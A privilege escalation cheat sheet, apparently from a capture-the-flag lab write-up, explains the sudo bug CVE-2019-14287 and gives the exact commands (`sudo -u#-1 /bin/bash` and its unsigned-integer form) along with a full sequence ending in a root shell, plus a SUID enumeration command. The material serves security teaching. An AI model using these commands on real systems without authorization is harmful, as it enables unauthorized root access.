# Privilege Escalation Cheat Sheet

## Overview

Privilege escalation is the process of moving from a lower-privileged foothold (e.g., a standard user shell) to higher privileges (e.g., root). This engagement's privilege escalation vector — a sudo misconfiguration combined with a vulnerable sudo version — is documented in full in [07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md).

## Common Syntax

```bash
sudo -l
sudo -V
sudo -u#-1 /bin/bash
```

## Useful Commands

| Command | Description |
|---|---|
| `sudo -l` | List sudo privileges for the current user |
| `sudo -V` | Show installed sudo version |
| `sudo -u#-1 /bin/bash` | CVE-2019-14287 bypass of a `(ALL, !root)` sudoers restriction |
| `find / -perm -4000 -type f 2>/dev/null` | Locate SUID binaries for potential GTFOBins-based escalation |
| `sudo -u#4294967295 /bin/bash` | Equivalent unsigned-integer form of the CVE-2019-14287 bypass |

## Important Options

| Option | Description |
|---|---|
| `-l` | List permitted sudo commands for the current user |
| `-u` | Specify the target user to run a command as |
| `-u#<uid>` | Specify the target user by **numeric UID** rather than username — this is the mechanism CVE-2019-14287 abuses |
| `-V` | Print version information |

## Examples

Full escalation sequence used in this engagement:

```bash
sudo -l
```

```text
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

```bash
sudo -V
```

```text
Sudo version 1.8.21p2
```

```bash
sudo -u#-1 /bin/bash
```

```text
root@agent-sudo:/# whoami
root
```

## Common Mistakes

- Assuming a `!root` exclusion in a sudoers rule is a complete safeguard — it depends entirely on the sudo version being patched (≥ 1.8.28) against CVE-2019-14287.
- Attempting to run the target binary directly as `root` via `sudo -u root` or `sudo bash -c ...` — this is correctly blocked; the exploit specifically relies on the **numeric UID** form (`-u#-1`).
- Not checking `sudo -V` before attempting a version-specific exploit.

## References

- [CVE-2019-14287 — NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [Exploit-DB 47502](https://www.exploit-db.com/exploits/47502)
- [GTFOBins](https://gtfobins.github.io/)

## Key Takeaways

- `sudo -l` and `sudo -V` together are enough to identify and confirm this entire privilege escalation vector.
- Numeric UID manipulation (`-u#-1`) is the core mechanism of CVE-2019-14287 and requires no compiled exploit code.
